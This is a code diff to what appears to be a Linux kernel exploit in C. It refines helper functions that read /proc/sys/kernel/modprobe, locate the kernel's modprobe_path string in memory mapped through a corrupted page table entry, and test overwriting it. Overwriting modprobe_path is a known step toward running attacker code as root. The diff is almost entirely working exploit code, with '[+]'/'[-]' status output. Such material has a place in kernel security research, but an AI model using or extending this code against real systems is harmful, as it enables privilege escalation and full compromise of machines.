@@ -191,11 +191,12 @@ static void flush_tlb(void *addr, size_t len)
 #define MODPROBE_PATH_PHYS_ADDR (KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_ADDR_OFFSET)
 #define MODPROBE_PATH_PTE_ENTRY ((MODPROBE_PATH_PHYS_ADDR & 0xfffffffffffff000lu) + PT_BITS)
 
-int get_modprobe_path(char *buf)
+int get_modprobe_path(char *buf, size_t buf_size)
 {
 	int fd = -1;
 	ssize_t bytes = 0;
 	int ret = EXIT_FAILURE;
+	size_t len = 0;
 
 	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
 	if (fd < 0) {
@@ -203,8 +204,8 @@ int get_modprobe_path(char *buf)
 		return EXIT_FAILURE;
 	}
 
-	bytes = read(fd, buf, PATH_MAX);
-	buf[PATH_MAX - 1] = 0;
+	bytes = read(fd, buf, buf_size);
+	buf[buf_size - 1] = 0;
 
 	ret = close(fd);
 	if (ret != 0)
@@ -215,6 +216,17 @@ int get_modprobe_path(char *buf)
 		return EXIT_FAILURE;
 	}
 
+	len = strlen(buf);
+	if (len < 1) {
+		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
+		return EXIT_FAILURE;
+	}
+	if (buf[len - 1] != '\n') {
+		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
+		return EXIT_FAILURE;
+	}
+	buf[len - 1] = 0; /* Skip the line feed '\n' */
+
 	return EXIT_SUCCESS;
 }
 
@@ -224,21 +236,19 @@ void *memmem_modprobe_path(void *memory, size_t memory_size)
 	char modprobe_path[PATH_MAX] = { 0 };
 	size_t modprobe_path_len = 0;
 	char *modprobe_path_uaddr = NULL;
-	char new_modprobe_path[PATH_MAX] = { 0 };
 
-	ret = get_modprobe_path(modprobe_path);
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
 		return NULL;
 
-	modprobe_path_len = strlen(modprobe_path);
+	printf("[!] original modprobe_path: %s\n", modprobe_path);
 
-	printf("[+] current modprobe_path: \"%s\"\n", modprobe_path);
-	if (modprobe_path[0] != '/' || modprobe_path[modprobe_path_len - 1] != '\n') {
+	if (modprobe_path[0] != '/') {
 		printf("[-] unexpected modprobe_path\n");
 		return NULL;
 	}
 
-	modprobe_path_len--; /* Skip line feed '\n' */
+	modprobe_path_len = strlen(modprobe_path);
 	modprobe_path_uaddr = memmem(memory, memory_size, modprobe_path, modprobe_path_len);
 	if (modprobe_path_uaddr == NULL) {
 		printf("[-] modprobe_path is not found in memory pointed by corrupted PTE\n");
@@ -249,11 +259,11 @@ void *memmem_modprobe_path(void *memory, size_t memory_size)
 	/* Test overwriting modprobe_path */
 	modprobe_path_uaddr[0] = 'x';
 
-	ret = get_modprobe_path(new_modprobe_path);
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
 		return NULL;
 
-	if (new_modprobe_path[0] != 'x') {
+	if (modprobe_path[0] != 'x') {
 		printf("[-] testing modprobe_path overwriting failed\n");
 		return NULL;
 	}
